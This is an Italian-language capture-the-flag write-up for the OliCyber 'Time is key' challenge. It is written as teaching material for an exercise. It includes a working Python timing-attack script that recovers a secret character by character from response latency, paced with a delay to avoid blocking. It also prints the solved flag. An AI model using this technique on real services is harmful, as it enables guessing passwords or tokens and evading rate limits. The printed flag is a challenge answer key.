# Writeup: Time is key

## Descrizione 📝
La challenge “Time is key” propone un sito in cui bisogna ottenere la flag nel minor tempo possibile. La particolarità è che la flag contiene solo lettere minuscole e numeri, e non segue il formato standard; pertanto, la flag deve essere racchiusa nel formato `flag{...}`.

Il sito è disponibile all’indirizzo:  
[http://time-is-key.challs.olicyber.it](http://time-is-key.challs.olicyber.it)

Per risolvere la challenge, è stato sviluppato uno script Python che sfrutta un attacco di timing. L’idea è di inviare richieste POST con possibili prefissi della flag e misurare la differenza di tempo di risposta. La risposta più lenta indica il carattere corretto per quella posizione.

## Sfruttamento 🎯

1. **Approccio**  
   Lo script testa, per ogni posizione della flag (la lunghezza complessiva è 6), tutti i possibili caratteri (solo lettere minuscole e numeri). Per ogni tentativo, viene misurato il tempo di risposta del server.  
   L’ipotesi è che il server impieghi più tempo a rispondere se il prefisso della flag è corretto.

2. **Implementazione dello Script**  
   Lo script utilizza la libreria `requests` per inviare richieste POST e `time.perf_counter()` per misurare la latenza. Per ogni posizione, lo script aggiunge un carattere candidato seguito da un padding di caratteri fittizi ('a') per raggiungere la lunghezza totale di 6.  
   
   Esempio di snippet:
   ```python
   import requests
   import time
   import string

   url = 'http://time-is-key.challs.olicyber.it/index.php'
   known_flag = ''
   headers = {'Content-Type': 'application/x-www-form-urlencoded'}

   for position in range(6):
       max_duration = 0
       correct_char = ''
       chars = string.ascii_lowercase + string.digits  # Solo lowercase e numeri

       print(f"Testando posizione {position + 1}/6")

       for c in chars:
           test_flag = known_flag + c + 'a' * (5 - position)
           total_duration = 0
           attempts = 2  # 2 tentativi per carattere

           for _ in range(attempts):
               start_time = time.perf_counter()
               try:
                   response = requests.post(url, data={'flag': test_flag}, headers=headers, timeout=7)
               except:
                   continue
               end_time = time.perf_counter()
               total_duration += (end_time - start_time)
               time.sleep(0.3)  # Delay minimo per evitare blocchi

           avg_duration = total_duration / attempts if attempts > 0 else 0

           if avg_duration > max_duration:
               max_duration = avg_duration
               correct_char = c

       known_flag += correct_char
       print(f"\nCarattere trovato: {correct_char} → Flag parziale: {known_flag}")

   print(f"\n[+] Flag completa: {known_flag}")
   ```
   Lo script stampa il carattere corretto per ogni posizione basandosi sul tempo medio di risposta.  

3. **Risultato**  
   Eseguendo lo script, si ottiene:
   ```
   [+] Flag completa: 71m1n6
   ```
   Racchiudendo la flag nel formato richiesto, la flag finale diventa:
   ```
   flag{71m1n6}
   ```

## Flag 🏁
```
flag{71m1n6}
```

## Lezioni Apprese 📚
1. **Attacchi di Timing**: Misurare il tempo di risposta del server può rivelare informazioni sensibili, come il prefisso corretto di una flag.  
2. **Automazione**: Utilizzare uno script Python per iterare su tutte le possibili combinazioni rende l’attacco efficiente e automatizzato.  
3. **Precauzioni di Rete**: L’uso di un delay minimo (0.3 secondi) è utile per evitare che il server blocchi le richieste ripetute.

## Tools Utilizzati 🛠️
- **Python (requests, time, string)**: Per implementare lo script di timing.
- **Terminale**: Per eseguire lo script e raccogliere la flag.

---

*Writeup by Luca Crippa - Last Updated: 2024*
